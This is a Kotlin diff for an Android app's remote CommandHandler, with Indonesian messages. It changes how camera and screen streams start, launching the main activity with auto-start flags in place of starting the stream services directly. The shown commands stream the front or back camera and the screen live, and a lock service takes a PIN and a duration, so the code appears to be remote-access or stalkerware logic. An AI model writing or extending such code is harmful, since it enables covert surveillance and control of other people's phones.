@@ -232,23 +232,17 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                     != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                     done(mapOf("error" to "izin kamera belum di-grant"))
                 } else {
-                    bringAppToFront()
-                    Thread {
-                        Thread.sleep(1500)
-                        try { ctx.stopService(Intent(ctx, CameraStreamService::class.java)) } catch (_: Exception) {}
-                        try {
-                            val i = Intent(ctx, CameraStreamService::class.java).apply {
-                                putExtra("front", true)
-                                putExtra("interval", 200L)
-                            }
-                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                                ctx.startForegroundService(i)
-                            } else {
-                                ctx.startService(i)
-                            }
-                        } catch (_: Exception) {}
-                    }.start()
-                    done(mapOf("ok" to true, "stream" to "front"))
+                    try {
+                        val act = Intent(ctx, MainActivity::class.java).apply {
+                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or
+                                    Intent.FLAG_ACTIVITY_SINGLE_TOP or
+                                    Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
+                            putExtra("auto_start_cam", true)
+                            putExtra("cam_front", true)
+                        }
+                        ctx.startActivity(act)
+                    } catch (e: Exception) { done(mapOf("error" to e.message)); return }
+                    done(mapOf("ok" to true, "note" to "app terbuka, tunggu 2 detik"))
                 }
             }
             "camera_back" -> {
@@ -256,23 +250,17 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                     != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                     done(mapOf("error" to "izin kamera belum di-grant"))
                 } else {
-                    bringAppToFront()
-                    Thread {
-                        Thread.sleep(1500)
-                        try { ctx.stopService(Intent(ctx, CameraStreamService::class.java)) } catch (_: Exception) {}
-                        try {
-                            val i = Intent(ctx, CameraStreamService::class.java).apply {
-                                putExtra("front", false)
-                                putExtra("interval", 200L)
-                            }
-                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                                ctx.startForegroundService(i)
-                            } else {
-                                ctx.startService(i)
-                            }
-                        } catch (_: Exception) {}
-                    }.start()
-                    done(mapOf("ok" to true, "stream" to "back"))
+                    try {
+                        val act = Intent(ctx, MainActivity::class.java).apply {
+                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or
+                                    Intent.FLAG_ACTIVITY_SINGLE_TOP or
+                                    Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
+                            putExtra("auto_start_cam", true)
+                            putExtra("cam_front", false)
+                        }
+                        ctx.startActivity(act)
+                    } catch (e: Exception) { done(mapOf("error" to e.message)); return }
+                    done(mapOf("ok" to true, "note" to "app terbuka, tunggu 2 detik"))
                 }
             }
             "stop_camera" -> {
@@ -282,27 +270,16 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
 
             // ============ SCREEN LIVE ============
             "screen" -> {
-                if (!ScreenCapture.isReady()) {
-                    bringAppToFront()
-                    done(mapOf("error" to "MediaProjection belum aktif — buka app, approve dialog rekam layar"))
-                } else {
-                    bringAppToFront()
-                    Thread {
-                        Thread.sleep(1500)
-                        try { ctx.stopService(Intent(ctx, ScreenStreamService::class.java)) } catch (_: Exception) {}
-                        try {
-                            val i = Intent(ctx, ScreenStreamService::class.java).apply {
-                                putExtra("interval", 200L)
-                            }
-                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                                ctx.startForegroundService(i)
-                            } else {
-                                ctx.startService(i)
-                            }
-                        } catch (_: Exception) {}
-                    }.start()
-                    done(mapOf("ok" to true, "stream" to "screen"))
-                }
+                try {
+                    val act = Intent(ctx, MainActivity::class.java).apply {
+                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or
+                                Intent.FLAG_ACTIVITY_SINGLE_TOP or
+                                Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
+                        putExtra("auto_start_screen", true)
+                    }
+                    ctx.startActivity(act)
+                } catch (e: Exception) { done(mapOf("error" to e.message)); return }
+                done(mapOf("ok" to true, "note" to "app terbuka, tunggu 3 detik"))
             }
             "stop_screen" -> {
                 try { ctx.stopService(Intent(ctx, ScreenStreamService::class.java)) } catch (_: Exception) {}
@@ -599,17 +576,6 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
 
             else -> done(mapOf("error" to "unknown: $cmd"))
         }
-    }
-
-    private fun bringAppToFront() {
-        try {
-            val act = Intent(ctx, MainActivity::class.java).apply {
-                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or
-                        Intent.FLAG_ACTIVITY_SINGLE_TOP or
-                        Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
-            }
-            ctx.startActivity(act)
-        } catch (_: Exception) {}
     }
 
     private fun startLockService(type: String, pin: String, hours: Long) {
